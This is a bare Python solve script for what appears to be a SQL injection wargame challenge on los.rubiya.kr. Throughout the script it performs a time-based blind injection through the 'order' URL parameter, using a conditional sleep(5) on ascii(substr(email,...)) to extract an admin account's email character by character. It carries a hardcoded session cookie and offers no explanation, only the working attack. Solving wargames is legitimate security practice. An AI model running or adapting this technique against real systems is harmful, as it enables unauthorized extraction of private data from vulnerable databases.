import requests
import string
import time


email=""
a=string.printable
#a=a[:-38]
url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
cookies = {'PHPSESSID':'aueirceajqi7bj8jk0862achkq'}
for i in range(1,29):
    for j in range(33, 126):
        url="https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=if(id=\"admin\" and ascii(substr(email,"+str(i)+",1))="+str(j)+",sleep(5),1)"
        starttime = time.time()
        res = requests.get(url,cookies=cookies)
        endtime = time.time()
        res = res.text
        print("%d : %c" % (i,chr(j)))
        if endtime-starttime>3:
            email+=chr(j)
            break
        else: 
            pass

print(email)